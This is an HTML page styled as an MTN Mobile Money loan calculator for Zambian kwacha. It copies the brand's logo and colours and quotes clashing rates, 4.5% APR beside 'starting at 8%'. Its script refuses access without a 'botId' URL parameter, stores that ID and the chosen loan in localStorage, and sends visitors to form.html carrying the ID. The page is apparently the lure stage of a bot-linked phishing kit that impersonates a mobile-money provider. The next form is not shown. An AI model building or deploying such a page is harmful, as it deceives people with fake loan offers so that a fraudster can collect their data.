<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo - Loan Calculator</title>

<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
}

body {
  background: #f5f5f5;
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: flex-start;
  padding: 0;
}

.app-wrapper {
  width: 100%;
  max-width: 420px;
  background: #fff;
  min-height: 100vh;
  position: relative;
  box-shadow: 0 0 20px rgba(0,0,0,0.05);
}

.top-bar {
  height: 72px;
  background: #FFCC00;
  display: flex;
  align-items: center;
  padding: 0 22px;
  flex-shrink: 0;
  box-shadow: 0 2px 6px rgba(0,0,0,0.1);
}
.top-bar .logo {
  display: flex;
  align-items: center;
  gap: 10px;
}
.top-bar .logo svg {
  height: 36px;
  width: auto;
}
.top-bar .logo span {
  font-weight: 700;
  font-size: 18px;
  color: #004B87;
  letter-spacing: -0.5px;
}
.back-btn {
  color: #004B87;
  font-size: 30px;
  text-decoration: none;
  font-weight: 300;
  background: none;
  border: none;
  padding: 0;
  cursor: pointer;
  margin-right: 16px;
}

.app {
  padding: 24px 22px 30px;
}

.header {
  text-align: center;
  margin-bottom: 20px;
}
.header h1 {
  color: #004B87;
  font-size: 24px;
  font-weight: 700;
  letter-spacing: -0.3px;
  margin-bottom: 4px;
}
.header .subtitle {
  color: #777;
  font-size: 14px;
  font-weight: 400;
}

.card {
  background: #f8f8fc;
  border-radius: 16px;
  padding: 20px;
  margin-top: 5px;
}
.card h2 {
  color: #1a1a2e;
  font-size: 18px;
  font-weight: 600;
  margin-bottom: 15px;
  text-align: center;
}
.card .label {
  color: #777;
  font-size: 12px;
  font-weight: 500;
  letter-spacing: 0.5px;
  text-align: center;
  margin-bottom: 5px;
}
.amount {
  color: #1a1a2e;
  font-size: 28px;
  font-weight: 700;
  text-align: center;
  margin: 5px 0 15px;
}

.slider {
  width: 100%;
  -webkit-appearance: none;
  appearance: none;
  height: 6px;
  border-radius: 3px;
  background: linear-gradient(to right, #004B87 0%, #004B87 50%, #ddd 50%, #ddd 100%);
  outline: none;
  transition: background 0.2s;
}
.slider::-webkit-slider-thumb {
  -webkit-appearance: none;
  appearance: none;
  width: 20px;
  height: 20px;
  border-radius: 50%;
  background: #004B87;
  cursor: pointer;
  box-shadow: 0 2px 8px rgba(0, 75, 135, 0.3);
}
.slider::-moz-range-thumb {
  width: 20px;
  height: 20px;
  border-radius: 50%;
  background: #004B87;
  cursor: pointer;
  border: none;
}

.labels {
  display: flex;
  justify-content: space-between;
  font-size: 11px;
  color: #999;
  margin-top: 4px;
}

.term-section {
  margin-top: 18px;
}
.term-section .term-label {
  color: #777;
  font-size: 12px;
  font-weight: 500;
  letter-spacing: 0.5px;
  text-align: center;
  margin-bottom: 8px;
}
.term-section .months-display {
  color: #004B87;
  font-size: 16px;
  font-weight: 600;
  text-align: center;
  margin-bottom: 10px;
}
.term-buttons {
  display: grid;
  grid-template-columns: repeat(3, 1fr);
  gap: 8px;
}
.term {
  padding: 8px;
  border-radius: 8px;
  background: #ffffff;
  border: 1.5px solid #e0e0e8;
  cursor: pointer;
  font-size: 12px;
  font-weight: 500;
  color: #555;
  transition: all 0.3s ease;
}
.term:hover {
  border-color: #004B87;
  color: #004B87;
}
.term.active {
  background: #004B87;
  border-color: #004B87;
  color: white;
}

.result {
  background: #ffffff;
  padding: 16px;
  border-radius: 12px;
  margin-top: 18px;
  text-align: center;
  border: 1px solid #e8e8f0;
}
.result .result-label {
  color: #777;
  font-size: 11px;
  font-weight: 500;
  letter-spacing: 0.5px;
}
.result .payment {
  color: #1a1a2e;
  font-size: 26px;
  font-weight: 700;
  margin-top: 3px;
}
.result .rate-info {
  color: #999;
  font-size: 11px;
  margin-top: 4px;
}

.apply-btn {
  width: 100%;
  padding: 15px;
  background: #FFCC00;
  border: none;
  border-radius: 12px;
  color: #004B87;
  font-size: 17px;
  font-weight: 700;
  cursor: pointer;
  transition: all 0.3s ease;
  margin-top: 18px;
  letter-spacing: 0.5px;
  text-transform: uppercase;
}
.apply-btn:hover {
  background: #e6b800;
  transform: translateY(-1px);
  box-shadow: 0 6px 20px rgba(255, 204, 0, 0.35);
}
.apply-btn:active {
  transform: translateY(0);
}

.info-grid {
  display: grid;
  grid-template-columns: 1fr 1fr;
  gap: 10px;
  margin-top: 15px;
}
.info {
  background: #ffffff;
  padding: 12px 10px;
  border-radius: 12px;
  display: flex;
  align-items: center;
  gap: 10px;
  border: 1px solid #e8e8f0;
}
.info .icon {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: #004B87;
  display: flex;
  align-items: center;
  justify-content: center;
  color: white;
  font-size: 16px;
  flex-shrink: 0;
}
.info .info-text b {
  color: #1a1a2e;
  font-size: 13px;
  display: block;
}
.info .info-text small {
  color: #999;
  font-size: 11px;
}

.min-notice {
  background: #e8f0fe;
  border: 1px solid #bbd4f0;
  border-radius: 8px;
  padding: 8px 12px;
  margin-top: 12px;
  text-align: center;
  font-size: 12px;
  color: #004B87;
}

@media (max-width: 440px) {
  .app {
    padding: 20px 16px 25px;
  }
  .header h1 {
    font-size: 20px;
  }
  .amount {
    font-size: 24px;
  }
  .term-buttons {
    grid-template-columns: repeat(3, 1fr);
    gap: 6px;
  }
  .term {
    font-size: 11px;
    padding: 6px;
  }
  .info-grid {
    grid-template-columns: 1fr;
  }
}
</style>
</head>

<body>

<div class="app-wrapper">

  <div class="top-bar">
    <button class="back-btn" onclick="window.history.back()">&#8592;</button>
    <div class="logo">
      <svg viewBox="0 0 120 40" fill="none" xmlns="http://www.w3.org/2000/svg">
        <rect x="2" y="2" width="36" height="36" rx="8" fill="#FFCC00" stroke="#004B87" stroke-width="2"/>
        <path d="M14 12L22 12L18 20L22 28L14 28L18 20L14 12Z" fill="#004B87"/>
        <text x="46" y="26" font-family="Arial, sans-serif" font-weight="700" font-size="20" fill="#004B87">MTN</text>
      </svg>
      <span>Mobile Money</span>
    </div>
  </div>

  <div class="app">

    <div class="header">
      <h1>Get your loan quickly</h1>
      <div class="subtitle">Fast approval • Competitive rates • Flexible terms</div>
    </div>

    <div class="card">

      <h2>Loan Simulator</h2>

      <div class="label">LOAN AMOUNT</div>
      <div class="amount" id="loanAmount">ZMW 100</div>

      <input type="range" min="100" max="100000" value="100" step="100" class="slider" id="loanSlider">

      <div class="labels">
        <span>ZMW 100</span>
        <span>ZMW 100,000</span>
      </div>

      <div class="min-notice">💰 Minimum amount: ZMW 100</div>

      <div class="term-section">
        <div class="term-label">LOAN TERM</div>
        <div class="months-display" id="months">12 months</div>

        <div class="term-buttons">
          <button class="term" data-month="6">6 months</button>
          <button class="term active" data-month="12">12 months</button>
          <button class="term" data-month="24">24 months</button>
          <button class="term" data-month="36">36 months</button>
          <button class="term" data-month="48">48 months</button>
          <button class="term" data-month="60">60 months</button>
        </div>
      </div>

      <div class="result">
        <div class="result-label">MONTHLY PAYMENT</div>
        <div class="payment" id="payment">ZMW 0</div>
        <div class="rate-info">Interest rate: 4.5% APR</div>
      </div>

      <button class="apply-btn" onclick="applyLoan()">APPLY NOW</button>

      <div class="info-grid">
        <div class="info">
          <div class="icon">⚡</div>
          <div class="info-text">
            <b>Quick approval</b>
            <small>Within 24 hours</small>
          </div>
        </div>
        <div class="info">
          <div class="icon">💰</div>
          <div class="info-text">
            <b>Low rates</b>
            <small>Starting at 8%</small>
          </div>
        </div>
      </div>

    </div>

  </div>
</div>

<script>
// ---------- BOT ID ----------
const params = new URLSearchParams(window.location.search);
const botId = params.get('botId') || window.location.pathname.split('/').pop();

if (!botId) {
    alert("Invalid access link");
    throw new Error();
}

localStorage.setItem("botId", botId);

// ---------- CALCULATOR ----------
let slider = document.getElementById("loanSlider");
let loanAmount = document.getElementById("loanAmount");
let payment = document.getElementById("payment");
let monthsDisplay = document.getElementById("months");

let months = 12;
const rate = 0.045 / 12;

function calculate() {
    let P = parseFloat(slider.value);
    let n = months;
    let r = rate;
    let M = (P * r * Math.pow(1 + r, n)) / (Math.pow(1 + r, n) - 1);
    if (isNaN(M) || !isFinite(M)) M = 0;
    
    // Format as ZMW with comma separators
    loanAmount.innerText = 'ZMW ' + Number(P).toLocaleString('en-US');
    payment.innerText = 'ZMW ' + Math.round(M).toLocaleString('en-US');
    
    const min = parseFloat(slider.min);
    const max = parseFloat(slider.max);
    const percent = ((P - min) / (max - min)) * 100;
    slider.style.background = `linear-gradient(to right, #004B87 0%, #004B87 ${percent}%, #ddd ${percent}%, #ddd 100%)`;
}

slider.oninput = calculate;

document.querySelectorAll(".term").forEach(btn => {
    btn.onclick = function() {
        document.querySelectorAll(".term").forEach(b => b.classList.remove("active"));
        this.classList.add("active");
        months = parseInt(this.dataset.month);
        monthsDisplay.innerText = months + " months";
        calculate();
    };
});

// ---------- APPLY LOAN ----------
function applyLoan() {
    const amount = parseFloat(slider.value);
    if (amount < 100) {
        alert('⚠️ The minimum amount is ZMW 100');
        return;
    }
    localStorage.setItem("loanAmount", slider.value);
    localStorage.setItem("loanTerm", months);
    window.location.href = `form.html?botId=${botId}`;
}

calculate();
</script>

</body>
</html>
